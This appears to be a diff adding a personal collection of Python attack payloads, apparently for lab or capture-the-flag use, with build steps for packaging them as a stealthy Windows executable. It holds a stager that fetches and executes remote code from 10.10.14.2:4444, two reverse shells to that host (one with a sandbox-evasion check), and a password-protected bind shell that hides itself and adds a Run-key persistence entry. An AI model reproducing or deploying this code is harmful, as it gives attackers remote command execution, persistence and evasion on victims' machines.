@@ -1,0 +1,174 @@
+1. change payload in mrtp.py
+2. python.exe ./setup.py py2exe
+3. use setupstealth for not poping cmd windows
+4. open file in dist/mrtp.exe
+
+
+
+
+mrev
+---------------------------------------------------------------
+import socket,zlib,base64,struct,time
+print ("lol")
+for x in range(10):
+        try:
+                s=socket.socket(2,socket.SOCK_STREAM)
+                s.connect(('10.10.14.2',4444))
+                break
+        except:
+                time.sleep(5)
+l=struct.unpack('>I',s.recv(4))[0]
+d=s.recv(l)
+while len(d)<l:
+        d+=s.recv(l-len(d))
+exec(zlib.decompress(base64.b64decode(d)),{'s':s})
+
+
+
+rev new
+---------------------------------------------------------------
+import os,socket,subprocess,threading;
+print ("lol")
+def s2p(s, p):
+    while True:
+        data = s.recv(1024)
+        if len(data) > 0:
+            p.stdin.write(data)
+            p.stdin.flush()
+
+def p2s(s, p):
+    while True:
+        s.send(p.stdout.read(1))
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.2",4444))
+
+p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+
+s2p_thread = threading.Thread(target=s2p, args=[s, p])
+s2p_thread.daemon = True
+s2p_thread.start()
+
+p2s_thread = threading.Thread(target=p2s, args=[s, p])
+p2s_thread.daemon = True
+p2s_thread.start()
+
+try:
+    p.wait()
+except KeyboardInterrupt:
+    s.close()
+
+
+
+
+rev
+---------------------------------------------------------------
+import os
+import socket
+import subprocess
+
+if os.cpu_count() <= 2:
+    quit()
+
+HOST = '10.10.14.2'
+PORT = 4444
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+s.send(str.encode("[*] Connection Established!"))
+
+while 1:
+    try:
+        s.send(str.encode(os.getcwd() + "> "))
+        data = s.recv(1024).decode("UTF-8")
+        data = data.strip('\n')
+        if data == "quit": 
+            break
+        if data[:2] == "cd":
+            os.chdir(data[3:])
+        if len(data) > 0:
+            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
+            stdout_value = proc.stdout.read() + proc.stderr.read()
+            output_str = str(stdout_value, "UTF-8")
+            s.send(str.encode("\n" + output_str))
+    except Exception as e:
+        continue
+    
+s.close()
+
+
+
+bind shell
+-----------------------------------------------
+import socket, os, thread, subprocess, sys, urllib2
+
+subprocess.call('copy ' + os.path.split(sys.argv[0])[1] + ' %userprofile%' + '\\' + os.path.split(sys.argv[0])[1], shell=True)
+subprocess.call('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v BindShell /d %userprofile%' + '\\' + os.path.split(sys.argv[0])[1], shell=True)
+subprocess.call('attrib +s +r +h %userprofile%' + '\\' + os.path.split(sys.argv[0])[1], shell=True)
+
+def connection(conn):
+	conn.setblocking(1)
+	conn.send("USER: ")
+	user = conn.recv(1024)
+	conn.send("PASS: ")
+	passwd = conn.recv(1024)
+	
+	if user.strip('\r\n') =='dxntboy' and passwd.strip('\r\n') == 'pass':
+		conn.send('Connection Established!')
+		while True:
+			conn.send('\n$')
+			data = conn.recv(1024)
+
+			if data.strip('\r\n') == 'quit' or data.strip('\r\n') == 'exit':
+				conn.close()
+				break
+
+			elif data.strip('\r\n').startswith('cd'):
+				try:
+					os.chdir(data.strip('\r\n')[3:])
+				except:
+					conn.send('The system path cannot be found!')
+
+			elif data.strip('\r\n').startswith('wget'):
+				try:
+					f = open(os.path.basename(data[5:]), "wb")
+					f.write(urllib2.urlopen(data[5:].read()))
+					f.close()
+					conn.send("Successfully downloaded %s" %os.path.basename(data[5:]))
+				except:
+					conn.send("Download failed!")					
+
+			else:
+				proc = subprocess.Popen(data.strip('\r\n'), shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
+				stdoutput = proc.stdout.read() + proc.stderr.read()
+				conn.send(stdoutput)
+
+	else:
+		conn.send("Incorrect user/pass combination!\n")
+		conn.close()
+
+
+while True:
+	try:
+
+		s = socket.socket()
+		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+		s.bind(('0.0.0.0', 8282))
+		s.listen(5)
+		
+		while True:
+			s.settimeout(2)
+			try:
+				conn, addr = s.accept()
+
+			except socket.timeout: 
+				continue
+
+
+			if(conn):
+				s.settimeout(None)
+				thread.start_new_thread(connection, (conn,))
+
+
+	except: pass
